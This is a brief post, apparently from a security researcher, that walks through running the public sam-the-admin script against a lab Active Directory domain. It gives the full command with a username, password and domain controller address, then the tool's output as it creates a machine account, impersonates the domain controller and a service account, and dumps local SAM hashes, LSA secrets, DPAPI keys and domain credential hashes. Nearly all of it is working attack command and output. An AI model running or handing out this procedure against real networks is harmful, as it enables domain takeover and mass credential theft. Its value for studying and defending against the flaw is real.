This uses https://github.com/WazeHell/sam-the-admin amazing script. https://twitter.com/safe_buffer

You need the DC's IP address.

root@kali:~/Documents/sam-the-admin# python3 sam_the_admin.py "hacklab.local/user2:Passw0rd!" -dc-ip 192.168.68.200 -dump
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Selected Target win-j032uv4jt0c.hacklab.local
[*] Total Domain Admins 12
[*] will try to impersonat svc_mssql1
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-54$"
[*] MachineAccount "SAMTHEADMIN-54$" password = KM1uAnF#7JTX
[*] Successfully added machine account SAMTHEADMIN-54$ with password KM1uAnF#7JTX.
[*] SAMTHEADMIN-54$ object = CN=SAMTHEADMIN-54,CN=Computers,DC=hacklab,DC=local
[*] SAMTHEADMIN-54$ sAMAccountName == win-j032uv4jt0c
[*] Saving ticket in win-j032uv4jt0c.ccache
[*] Resting the machine account to SAMTHEADMIN-54$
[*] Restored SAMTHEADMIN-54$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating svc_mssql1
[*] 	Requesting S4U2self
[*] Saving ticket in svc_mssql1.ccache
Impacket v0.9.23.dev1+20210416.153120.efbe78bb - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xefb5b40d-redacted-c9367e5b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SERVER1\WIN-J032UV4JT0C$:plain_password_hex:72d9b9c4c29d93b14bc106b0b-redacted-536a8e128a5695e4cbd0fa03f5c44bcbf6cc262d0081b94c3ff2ac106131c2c0a4dee8aa9cdb38172aa737f39784073a2aa9e44fd
SERVER1\WIN-J032UV4JT0C$:aad3b435b51404eeaad3b435b51404ee:d151bdede-redacted-1e62a:::
[*] DefaultPassword 
SERVER1\admin:Passw0rd!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0708ff0af3-redacted-21305f2b2
dpapi_userkey:0x8ff7b7fe88882-redacted-48c1c96
[*] NL$KM 
NL$KM:4c988684471dc8d68f69000ee-redacted-2bf6b0c10
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
